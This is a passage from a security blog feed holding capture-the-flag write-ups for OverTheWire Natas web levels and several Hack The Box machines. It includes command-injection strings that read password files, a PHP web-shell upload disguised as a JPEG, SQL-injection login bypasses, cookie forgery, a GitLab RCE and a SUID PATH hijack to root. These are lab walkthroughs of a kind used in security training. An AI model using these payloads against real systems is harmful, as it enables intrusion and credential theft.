href="http://natas7.natas.labs.overthewire.org/">http://natas7.natas.labs.overthewire.org</a><br>The index page routed request based on query param passed to it . About page gave about , home page gave home in query param, we replace the query param to <code>/etc/natas_webpass/natas8</code><br>get the pass</p><p>Same request using python<br><img src="/images/natas13.png" alt="natas13"><br>Passed the parameters through the amazing python requests library.</p><h3 id="Natas-Level-7-→-Level-8"><a href="#Natas-Level-7-→-Level-8" class="headerlink" title="Natas Level 7 → Level 8"></a>Natas Level 7 → Level 8</h3><p>Username: natas8<br>URL: <a href="http://natas8.natas.labs.overthewire.org/">http://natas8.natas.labs.overthewire.org</a><br>Found an encoded string in the application logic for authentication<br><img src="/images/natas14.png" alt="natas14"><br>I know the encoded string so if I do reverse of it I should get the secret and when I pass the secret in the post call I should get the password</p><ol><li>hex 2 bin first</li><li>String reverse</li><li>Base 64 decode<br>Converted back<br>Access granted.</li></ol><h3 id="Natas-Level-8-→-Level-9"><a href="#Natas-Level-8-→-Level-9" class="headerlink" title="Natas Level 8 → Level 9"></a>Natas Level 8 → Level 9</h3><p>Username: natas9<br>URL: <a href="http://natas9.natas.labs.overthewire.org/">http://natas9.natas.labs.overthewire.org</a><br>The code takes a keyword from ui and does a grep on a dictionary file on the system directly through the passthru function<br><img src="/images/natas15.png" alt="natas15"><br>We can pass other commands after ; as its shell<br><code>dmeg; cat /etc/natas_webpass/natas10</code><br><img src="/images/natas16.png" alt="natas16"></p><h3 id="Natas-Level-9-→-Level-10"><a href="#Natas-Level-9-→-Level-10" class="headerlink" title="Natas Level 9 → Level 10"></a>Natas Level 9 → Level 10</h3><p>Username: natas10<br>URL: <a href="http://natas10.natas.labs.overthewire.org/">http://natas10.natas.labs.overthewire.org</a><br>the function in this level checks for any bad characters<br>We can use grep to exploit<br>Grep takes more than one file as input<br>So in the $file variable we pass a letter and the file path for password<br><code>/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</code></p><h3 id="Natas-Level-10-→-Level-11"><a href="#Natas-Level-10-→-Level-11" class="headerlink" title="Natas Level 10 → Level 11"></a>Natas Level 10 → Level 11</h3><p>Username: natas11<br>URL: <a href="http://natas11.natas.labs.overthewire.org/">http://natas11.natas.labs.overthewire.org</a><br>The cookies are base64 encoded , we have to decode them first<br>Use the value and cipertext to get the xor key<br>Use the xor key to encrypt a data with show password set to yes<br>Send that as cookies<br>Voila<br>Cookie - <code>ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxEIaAw=</code><br>Base64 decoded value - <code>UK&quot;H+O%pSWh]UZ-T%UhR^h</code><br>%3d is basically = in url encoding language because somebody decided for it to be so<br>details about xor plaintext attack <a href="https://alamot.github.io/xor_kpa/">https://alamot.github.io/xor_kpa/</a></p><blockquote><p>We should not forget that:<br>*plaintext ⊕ key = encrypted_text<br>*encrypted_text ⊕ plaintext = key<br>*encrypted_text ⊕ key = plaintext</p></blockquote><p>This basically means if I encrypt the cipher text with the key being plain text we get the xor encryption key<br><img src="/images/natas18.png" alt="natas18"><br>Xor key qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq<br>Use this key to get new cookie<br>Cookie encrypted in xor with the key ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK<br><img src="/images/natas19.png" alt="natas19"><br>got the password</p><h3 id="Natas-Level-11-→-Level-12"><a href="#Natas-Level-11-→-Level-12" class="headerlink" title="Natas Level 11 → Level 12"></a>Natas Level 11 → Level 12</h3><p>Username: natas12<br>URL: <a href="http://natas12.natas.labs.overthewire.org/">http://natas12.natas.labs.overthewire.org</a><br>There is an image upload option so created one php file with the jpg extenstion that basically cats the password file<br><code>echo &quot;&lt;?php echo system(\&quot;cat /etc/natas_webpass/natas13\&quot;); ?&gt;&quot; &gt; natas12.jpg</code><br>Uploaded the jpg file to the server<br>Changed the randomly generated filename in the request packet from .jpg to .php using burp suite<br>File was created with .php extension<br>Opened the file path on browser<br>Got the password<br><img src="/images/natas21.png" alt="natas21"><br><img src="/images/natas22.png" alt="natas22"></p><h3 id="Natas-Level-12-→-Level-13"><a href="#Natas-Level-12-→-Level-13" class="headerlink" title="Natas Level 12 → Level 13"></a>Natas Level 12 → Level 13</h3><p>Username: natas13<br>URL: <a href="http://natas13.natas.labs.overthewire.org/">http://natas13.natas.labs.overthewire.org</a><br>The only change in this level from previous level is there is now a check and only jpg files can be uploaded<br>We need to show our php file with jpeg extension to be a legit jpeg file<br>How we do that ?<br>How does the server verify a file type?<br>In this case, we need to know how files’ types are recognized, after some research you’ll stumble upon something called file signatures/magicnumbers.. A JPG file contains the following HEX signature: FF D8 FF DB.<br>ctrl+A for adding null bytes<br>Add 4 null bytes to add hex signature for jpg<br>We will use python to add the signature bytes<br>Another way of doing this is create a new file<br>Concatenate the signature hex string to <code>&lt;? passthru($_GET[&quot;cmd&quot;]); ?&gt;</code> which is also a way to get shell in php</p><p>We are going to use this command to get the password for level14</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo system(\&quot;cat &#x2F;etc&#x2F;natas_webpass&#x2F;natas14\”); ?&gt;</span><br><span class="line">Need to add this with the hexadecimal</span><br><span class="line">fh.write(&#39;\xFF\xD8\xFF\xE0&#39; + &#39;&lt;?php echo system(\&quot;cat &#x2F;etc&#x2F;natas_webpass&#x2F;natas14\”); ?&gt;&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/natas23.png" alt="natas23"></p><p>File is recognised as image file and contains our payload</p><p><img src="/images/natas24.png" alt="natas24"></p><p>Sending this file now</p><p><img src="/images/natas25.png" alt="natas25"></p><p>File uploaded<br>After that the payload was created properly and the php file was uploaded<br>All I had to do was pass ?cmd=“mycommand” to allow passthru in my payload to run it on the underlying machine</p><h3 id="Natas-Level-13-→-Level-14"><a href="#Natas-Level-13-→-Level-14" class="headerlink" title="Natas Level 13 → Level 14"></a>Natas Level 13 → Level 14</h3><p>Username: natas14<br>URL: <a href="http://natas14.natas.labs.overthewire.org/">http://natas14.natas.labs.overthewire.org</a><br><img src="/images/natas26.png" alt="natas26"><br>Since the code Is not sanitising the input taken from the post request sent by the user and directly using it in the query . We can send bad inputs to comment the password check so we can bypass that.<br>Sqlinjection attack vector basically does is, it either sends a parameter to comment out portion of the sql query or use conditions that will always be true.<br><img src="/images/natas27.png" alt="natas27"><br>All these combinations will work.</p><ol><li>The ( “ ) tells the sql engine that the query ends here(in this injection , after we have given the username) and (#) tells it after this its comment.</li><li>The (“) command in the first place tells the sql engine that the user is already over and then gives it a statement that will always be true which is here (1=1) followed by # telling the engine to comment out the rest. The example 1 was in case when we knew what the username was and 2 in the case we dint know user or password</li><li>3rd is supposing we are sure about user which is natas15 and for the password it is using (“) first to close the colon followed by an or to a statement that will always be right because this will send the value of password filed as blank and it will as is not pass.</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> OTW </tag>
            
            <tag> WARGAMES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Breach</title>
      <link href="2020/12/19/Breach/"/>
      <url>2020/12/19/Breach/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/breach1.png" alt="breach"></p><p>There is an encrypted file and a txt file with a job post for web developer provided in the zip file along with a breached data dump of info about everybody who applied to the job .</p><a id="more"></a><p><img src="/images/breach2.png" alt="job"></p><p><img src="/images/breach3.png" alt="dump"></p><p>looking at the social media posts of the afforesaid company first . </p><p>found the HR</p><p><img src="/images/breach4.png" alt="HR"></p><p>searched for the HR’s name in the dump we have and found a hit. </p><p><img src="/images/breach5.png" alt="hr1"></p><p>will try to open the encrypted file with the password <code>Love!July2018</code> and its iterations .</p><p>March instead of July worked and can now read the file</p><p><img src="/images/breach6.png" alt="file"></p><p>decrypted the string with base64 and got the flag </p><p><img src="/images/breach7.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
            <tag> OSINT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laboratory</title>
      <link href="2020/12/19/Laboratory/"/>
      <url>2020/12/19/Laboratory/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/lab1.png" alt="laboratory"></p><p>There is a balding scientist fiddling with a beaker in the picture. Regardless starting with the machine by firing it up and noting its ip address .</p><a id="more"></a><h3 id="Reconnaisance"><a href="#Reconnaisance" class="headerlink" title="Reconnaisance"></a>Reconnaisance</h3><p>nmap result :- </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] Nmap: PORT    STATE SERVICE  VERSION</span><br><span class="line">[*] Nmap: 22&#x2F;tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">[*] Nmap: 80&#x2F;tcp  open  http     Apache httpd 2.4.41</span><br><span class="line">[*] Nmap: 443&#x2F;tcp open  ssl&#x2F;http Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">[*] Nmap: Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line">[*] Nmap: Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 170.27 seconds</span><br><span class="line">[*] Nmap: Raw packets sent: 131180 (5.772MB) | Rcvd: 113 (4.972KB)</span><br></pre></td></tr></table></figure><p>three usual ports 22, 80 and 443 . will start by checking whats on the http server . </p><p>the http server has a static website about the laboratory . there is error in the https certificate though which says it was generated for <em>git.laboratory.htb</em> and not <em>laboratory.htb</em> . </p><p><img src="/images/lab2.png" alt="https"></p><p>there is a gitlab hosted on the git subdomain. gitlab, laboratory , geddit ? </p><p><img src="/images/lab3.png" alt="gitlab"></p><p>a quick <a href="https://github.com/offensive-security/exploitdb">searchsploit</a> for gitlab gives the following results</p><p><img src="/images/lab4.png" alt="sploits"></p><p>can boil down to which of them will potentially work if could know the version of gitlab. </p><p><img src="/images/lab5.png" alt="version"></p><p>sir google ordains this is vulnerable to <a href="https://hackerone.com/reports/827052">Arbitrary file read via the UploadsRewriter when moving and issue</a> . </p><p>This can be used to get RCE </p><p>Will get the secret_key_base from <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code> using the arbitrary file read and then use the experimentation_subject_id cookie with a Marshalled payload.</p><p>there is a metasploit exploit of the same vulnerability , which when used , dropped in a shell as user git . </p><blockquote><p>This module provides remote code execution against GitLab Community Edition (CE) and Enterprise Edition (EE). It combines an arbitrary file read to extract the Rails “secret_key_base”, and gains remote code execution with a deserialization vulnerability of a signed ‘experimentation_subject_id’ cookie that GitLab uses internally for A/B testing. Note that the arbitrary file read exists in GitLab EE/CE 8.5 and later, and was fixed in 12.9.1, 12.8.8, and 12.7.8. However, the RCE only affects versions 12.4.0 and above when the vulnerable <code>experimentation_subject_id</code> cookie was introduced. Tested on GitLab 12.8.1 and 12.4.0.</p></blockquote><p><img src="/images/lab6.png" alt="msf-exploit"></p><p>now have to do privilege escalation . will run the <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">peas</a> script to check our prospects. </p><p>Among a large dump of results the most interesting one in this situation was -</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">If you have enough privileges, you can change the password of any user runnig: gitlab-rails runner &#39;user &#x3D; User.find_by(email: &quot;admin@example.com&quot;); user.password &#x3D; &quot;pass_peass_pass&quot;; user.</span><br><span class="line">password_confirmation &#x3D; &quot;pass_peass_pass&quot;; user.save!&#39;  q</span><br></pre></td></tr></table></figure><p>did this and changed password for the admin user , so can login on gitlab and check what they got</p><p><img src="/images/lab7.png" alt="dex"></p><p>got <em>Dexter’s</em> ssh keys and can login and get user flag</p><p><img src="/images/lab8.png" alt="keys"></p><p>upon login checked all suid binaries using :- </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for file in $(find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null ); do ls -al $file; done;</span><br></pre></td></tr></table></figure><p>got an interesting binary </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-security</span><br></pre></td></tr></table></figure><p>upon checking what it does , it runs the following highlighted command </p><p><img src="/images/lab9.png" alt="docker-security"></p><p>since this is owned by root this runs as root . so will try to inject <em>bash -i</em> someway in this while it is running .<br>for this will create a chmod binary of our own with the command <em>bash -i</em> in it and change the path to use the dir with our chmod binary in it while running the <em>docker-security</em> command .</p><p><img src="/images/lab10.png" alt="root"></p><p>and we have root</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netmon</title>
      <link href="2020/12/14/Netmon/"/>
      <url>2020/12/14/Netmon/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/net1.png" alt="netmon"></p><p>Port 80 has the PRTG Network Monitor running . </p><a id="more"></a><blockquote><p>PRTG Network Monitor is an agentless network monitoring software from Paessler AG. It can monitor and classify system conditions like bandwidth usage or uptime and collect statistics from miscellaneous hosts as switches, routers, servers and other devices and applications.</p></blockquote><p>to start will try to check any known vulnerabilties or exploits on it . </p><p>There is a <a href="https://www.exploit-db.com/exploits/46527">(Authenticated) Remote Code Execution on PRTG Network Monitor 18.2.38 </a> but for that to work we need access to the credentials . should get clearer once we know the version . </p><h3 id="Reconnaisance"><a href="#Reconnaisance" class="headerlink" title="Reconnaisance"></a>Reconnaisance</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[*] Nmap: PORT      STATE    SERVICE      VERSION</span><br><span class="line">[*] Nmap: 21&#x2F;tcp    open     ftp          Microsoft ftpd</span><br><span class="line">[*] Nmap: 80&#x2F;tcp    open     http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)</span><br><span class="line">[*] Nmap: 135&#x2F;tcp   open     msrpc        Microsoft Windows RPC</span><br><span class="line">[*] Nmap: 139&#x2F;tcp   open     netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">[*] Nmap: 445&#x2F;tcp   open     microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">[*] Nmap: 3021&#x2F;tcp  filtered agriserver</span><br><span class="line">[*] Nmap: 3803&#x2F;tcp  filtered soniqsync</span><br><span class="line">[*] Nmap: 5985&#x2F;tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">[*] Nmap: 11585&#x2F;tcp filtered unknown</span><br><span class="line">[*] Nmap: 12901&#x2F;tcp filtered unknown</span><br><span class="line">[*] Nmap: 18486&#x2F;tcp filtered unknown</span><br><span class="line">[*] Nmap: 20102&#x2F;tcp filtered unknown</span><br><span class="line">[*] Nmap: 21516&#x2F;tcp filtered unknown</span><br><span class="line">[*] Nmap: 22591&#x2F;tcp filtered unknown</span><br><span class="line">[*] Nmap: 29134&#x2F;tcp filtered unknown</span><br><span class="line">[*] Nmap: 46453&#x2F;tcp filtered unknown</span><br><span class="line">[*] Nmap: 47001&#x2F;tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">[*] Nmap: 49664&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">[*] Nmap: 49665&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">[*] Nmap: 49666&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">[*] Nmap: 49667&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">[*] Nmap: 49668&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">[*] Nmap: 49669&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">[*] Nmap: 54942&#x2F;tcp filtered unknown</span><br><span class="line">[*] Nmap: 65436&#x2F;tcp filtered unknown</span><br><span class="line">[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line">[*] Nmap: Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 3218.74 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>port 21 has anonymous login enabled so will try that </p><p><img src="/images/net2.png" alt="ftp"></p><p>got the user file by iterating through a few directory</p><p><img src="/images/net3.png" alt="user"></p><p>should be the fastest user</p><p>now for privilege escalation will check out files for the  <em>PRTG Network Monitor</em> on the ftp .</p><p>there is a .bak file for the <em>PRTG Configuration</em> which could have user credentials .</p><p><img src="/images/net4.png" alt="prtg"></p><p>the file has credentials for the database which could have been reused on the portal . because thats how CTF challenges go </p><p><img src="/images/net5.png" alt="creds"></p><p>the above credentials worked with <em>2019</em> instead of <em>2018</em> .</p><p><img src="/images/net6.png" alt="user"></p><p>now that have the user can checkout the exploit we found in the beginning</p><p>since the exploit needs an authenticated cookie with a lower privilege user , will extract it using burp.</p><p><img src="/images/net7.png" alt="burp"></p><p>running the exploit using the cookie </p><p><img src="/images/net8.png" alt="exploit"></p><p>as it says . exploit completed new admin user ‘pentest’ with password ‘P3nT3st!’</p><p>logged in using the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">impacket script</a><br>and got the root flag</p><p><img src="/images/net9.png" alt="admin-login"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>You know 0xdiablos</title>
      <link href="2020/12/14/You%20know%200xdiablos/"/>
      <url>2020/12/14/You%20know%200xdiablos/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="1bb42737b9666b619865c77bf1e08331b50a07f7d854a37eef09c46afd855365">72cdafaa1b69b220ea025c1174658f88a1567c985c3387276032f4f79e9fc15115ea8dab4d4324434251473ea2c8242388c38fe715e5da32918e662e3e2b1207f09404e6a6bb60ceedc0e41cc7b69f5c5635a9fbe4ba16d2ba3d7720e7639107c7390f8dff35af8dcc3e607c7b2a8bb78ddd8269c9943eb5ca9940fbd2eaab524080ae4631c4c04257555c0c38c0a0933147b552feba0fde46ebfe5f9e2bb924a4f8101c9c822ad1bc9ab4b4bef53b0a8f83030b42daf6ba562dcf7427f540be9affd2631d46b7be9c747c08053887eebacddfc29dae7a988cc1bccb7451912a20e309cd893664bf9c9f8ca60c5b22f9673bdd2b5bb334e8efb0d7410e6e79e275e479c4877b2d78547a37e561ebbe2592ea7c9ade8c03a90ef3beaf1a7f603244670157209e3a07ab8763c1ebf47327ed77aac7983a5d4d9c8e8d59774bcb512ede1ef3a66e0ef99ef5933fdf0cb0ef48452e753f80978dc1d79fb2d01aab1e0ef0926655cd371313aeed3b5a530f049b0268815065cf7eaaa83cbc04668fdeb96a9fb8bb7f430bd60fb5f1aa1fb6e79e5b7b07a18560a83ea9d62fbb5afa2456940fe2a42091d77d04719069bb6f387f6c3dd85d1f419cef93f273e9a9683ceb3a0284799a2bbc824ddfbcf10fa4cfff7ed15984c5863592b9c09ae1ac81d4faf82325f0ca9012970bab62c5aabca46e9c33077e8206e7373bc6d8e3438425b968638c7c46c6e9a051687e3c202f3b344d1c5abe1c9b15a437b5d2fa983927ea2439678e071b5d7e21b1c948deba3f2c19cc6d44780e9e754e4a36902a50475dfdec390a065ecb5d453705f5c69576ab188ceb15ab7bab0c9f26c5f26c6d18771d15e815c0c38ecec7698827043ef9dc45a592b4da3ce1489415fb393d78d1681379e0ae7287ba2b1dc26e3e50cb1da4b29065db122c5e4ca22baa52b2bb2877ea49cf1c0fdd51fbc8f4c830dc002f505db533b70830e6b3948f7c9c7aa45dd3f4887570628d34e7d8a0a283261308d14d56ecdfad4089ce3bc7a26ace5f3afce761be6f7fce09099743d5ce4e8593c933bc2b594025bea53b1e6f6969549cf2168a2e154433ac8d77f730d5c9242fcd3e6abff629adb3f9ac001f2165bd02b8f56fdbe05fe933181821a8279d5be89320304f556a4a91de320afa1301ce65288aea9f385d5035828363dc50160f7796eaf8735f7bf7dc288d8f3a26fbacdd9ce3055860d5c021f60343837cb7effa1fe5cb29169a746b4d80bc56699c1b0ef55469e4e1ab935f5f0f47d33c25b5f90c370ea81cd8617e53fdb1a9a534de1cf221b0f9d8c67a142c5503b1d8bcc5e7572a98ead6b5dda815f56178cacfe0a915f1a83df0ab54fc130628a120ba4aa58a0f1767cbbad2a4b3c5f73d2f0370a1ddaa1612e93dd72351aeef1764e64d2bdb57cfa6b9058a4954b60af15e1c79c0a64f6c34d17bea34e963b386272d769766e6b87c456b0e741b77a33bced6b8b076811f91ca0e57ced8e39ef0cf2f0cd5f12a5d7acf5741b3a66ee3b100a5b84016909912388704780d549b101d3783a52689cfc9b3670d6afcca33537c17fa3d4db0cbc447fdb036a38790762b9ec7836ccb2f4d70f44a185c21e42d01d72a2779a0991da5ef8839329e3c56eff23783ee0d6331c46fd3738b654078c75b621f2843dde7013994cad41e4b5ba5926ef0ff3a8c4a38e5fd44787bf61e8823d98aa87326c0fe46180d3a909e6343fb9e0f242b4c61536bf77bce3a5d8e830106a78ee21c0466c2f4a17a41b2bd7a5e07f5b7dd755bbfe5b2cb0ded62e262228565f967c47cbda9a53def0e46362bd16dd56e59c4328f436ba54bb9f7000d12840de73951c2e29dcdaed280feaf8cb5bd559cf4a8c3659770739ba98bc303e2e47aaf3cb6b9bae0c6bb5bc1aacaf67f8c82990f05b52dc729d3f3dadc0d6337efa347f68d2d50f682056241a80e41c913f1fdcfa075729006d2ed3777444192f5f7bfb8e7ce2d84d0c23dd6935daef5e045373f0d748bf6d160e20b9b62c02d94b080460329df83a5d79742b3bea002fd0ee4411cc325cdb5c219bc702a5a8c330247535c2fdd379b8328846aa57f9363ed86280a485ef9f3fcaac2b7cc0b63f1f5a720ec17cb8ec0baa779cbb42b4907d9bd9d09e53bd9746b0db243f2e6b735308d9ef5fe9a2806a1b0e2a4f57c6fd94ac7ac4abccc5607ecb4cbdd9a06e7592abfc6b049cc11b062c1c21e880b0b3fd38ff4671ca739af0c68f214b0b9bdaa54bb7795b8e9189c3908cae270c473c7521d47bf27fd2a467a905fa3dd1b001586ec47689b5d4e175c4ad5646f5727551a815f7186fb0f0c63fa4b46a1306fb4dcf75ac1006bf39e6fb84c3804acd3e9e5a2ef368ba1c44f0647240145642a5200186504a47c0b356e68bd35da25d0bcdf70f6cc6dead9cffa10b0a4e66575d315a0ae0f925a2c2b2387ecba45424b875b1c1b12323c9f449ff6dac049fa876c17057c59caf69706515618c25c3d35a5a902194bf7a962892120ba4115e519606611323e4fd7eefb106a0502f2c9a47f2fb227b8ad233e35f8b5bbc2f0fcf90766f6c17f14b49ae314edc1981ace370c6c6642a75825474c1d4659876b6918a0392eccefb6c658055d46cda5cda2d45e4d6b8ba5b020f9388d8feec074929bf0e5b9c6ab067748b58f17bbf104d544be198a8dc8c0679359796c8c507894ffcd909debf9f5f0f23ddb0bd57cbd83059cbfb4c03b326eedb373261c633c0815d1212878eb93cb69fd4dc06980f9105f817631cd9e3a63ad40ec1ff3524fb10d2e75872afeb77ba74e56143f291f4890273c2b313720dfce761efe431ab68d89b29f2548d173029477425dcc0658e9c579984648d3e48470aed3a7bddef6d8687d9e183e258408c675d0089156a40f4e3241d861f3acce649f596646c35c44f49d11e6c6ff38c31a1d5eba88548bf96bdc844c29bd22387116d9b7828caf09a99044a872be027815eab822f4765163a7e383516a4ce12e52054671fb4644e5763f0d9754c7a356da7376d7a659ed8a571dc907c1a094cffd939ca3f8727fe9619fe3257b7a592cbdcb87b9e2ef829a50516b63b408f5481c71ca84138f338faee373db4209d156a01dd69bc1f2cbd9b4116d405b6bdcb4f77aabbd7bb2fc0d44627b1a05f9c27e998bcf9079dbddcfde610cde313fa0b1c7b74b7b843c97a21ca42179deaf73c48e3e7df5b7f62c1ecd06b691b21525139826b189bb9557cacc16c07246b21846c2f57765550e677901ac4bc1ce3153ff4b007430f8eed0e5f810fac348a301655f2a9d27725e369ead44d1033f09b5579bf1e4dbbb36fd81b5bb47fb410db0ec771c07daec8c2b3d3f558f263ff860a83af695e49ea647f977177164c366d5b21b655cee60fe1d6211705ed1ad9e44b77da34c041ef45eb9475f971771da1f369a7c306686415f348aca90c5cd7115b981c7463e6a291962ac44a8d45d6bae147a8ebbf9df057b7c2a3cd057f9f8843cc6b399bc7688a77ee59d7fc60bf62499cf7cdd7f3dabac51774903d8829142e4a32d8d9c19c97702d6d07e858f878fecd325779c28a37823fe10e2b09bea154647d64ae29920297425d6268897dd5571d970c51fbc3d93c73d9db636df37d1600571cfce484a7507790bce7544b9254a849a3a443b4086b424dec70056e4f48ef765e1d03da398b0b193aa730e196a9200e6309bba4d67ba7f9c7cd66d0da50aabdab55d0ab2a488ef9e60dbea4b919b8a98ff0da6624b9f94e66daaca49cd9bda34a2ccd67e03639fb2c2498cfc67ff97bf791beb2cefcefe99ec1b1cc34a02c9d6de6e792dacfea8bd6bbc1cf94fb89cdc7c1cadf91ea7718ccb35a826842c2913dbc52c7d981e5617b876a7e1821b93408139efa5b772267f7613e0e1bb3d78178a5610ed515135f50422902b003187cfedb58413cfb3f1c0f0a75e91d52915a7510ece54aa93e5e443bf2c411e499ff771b3d548971562e700157699f1cc5195d8a4471bb232b4ea53e56b4f1bfc9222951774c154d4973284</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
            <tag> BUFFER OVERFLOW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Academy HTB</title>
      <link href="2020/12/13/Academy%20HTB/"/>
      <url>2020/12/13/Academy%20HTB/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/academy11.png" alt="academy11"></p><p>This is the step by step walkthrough of the <a href="https://www.hackthebox.eu/">Academy Machine on Hack the box</a> . According to Machine Difficulty Rating, it is chategorized at medium difficulty by most fellow haxors</p><a id="more"></a><p><img src="/images/academy12.png" alt="academy12"></p><p>Will get the machine started and note the ip address</p><p><img src="/images/academy1.png" alt="academy"></p><p>Initial Reconnaisance results :-</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[*] Nmap: 22&#x2F;tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">[*] Nmap: 80&#x2F;tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">[*] Nmap: 33060&#x2F;tcp open  mysqlx?</span><br><span class="line">[*] Nmap: 1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">[*] Nmap: 